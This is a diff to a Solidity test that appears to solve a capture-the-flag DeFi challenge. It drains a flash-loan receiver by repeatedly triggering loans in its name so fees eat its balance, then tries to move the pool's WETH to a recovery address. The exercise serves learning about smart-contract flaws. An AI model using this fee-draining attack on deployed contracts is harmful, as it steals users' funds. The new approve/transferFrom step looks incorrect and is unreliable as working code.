@@ -91,27 +91,23 @@ contract NaiveReceiverChallenge is Test {
         uint256 fee = pool.flashFee(address(weth), flashLoanAmount);
         uint256 receiverBalance = weth.balanceOf(address(receiver));
         uint256 poolBalance = weth.balanceOf(address(pool));
-
-        console.log("Flash loan amount:", flashLoanAmount);
-        console.log("Flash loan fee:", fee);
-        console.log("Initial receiver balance:", receiverBalance);
+        
         console.log("Initial pool balance:", poolBalance);
-        console.log("--------------------");
 
         // @question doesn't seem very secure that we can externally call flashloans for other contracts/wallets, isn't this prevented usually?
         do {
             pool.flashLoan(IERC3156FlashBorrower(address(receiver)), address(weth), flashLoanAmount, "");
             receiverBalance = weth.balanceOf(address(receiver));
-            console.log("Updated receiver balance:", receiverBalance);
         } while (receiverBalance >= fee);
 
-        console.log("Final receiver balance:", weth.balanceOf(address(receiver)));
 
         console.log("Pool balance before transfer:", weth.balanceOf(address(pool)));
 
         poolBalance = weth.balanceOf(address(pool));
+        weth.approve(recovery, poolBalance);
+        weth.transferFrom(address(pool), recovery, poolBalance);
 
-        weth.transfer(recovery, poolBalance);
+        // weth.transfer(recovery, poolBalance);
 
         console.log("Pool balance after transfer:", weth.balanceOf(address(pool)));
     }
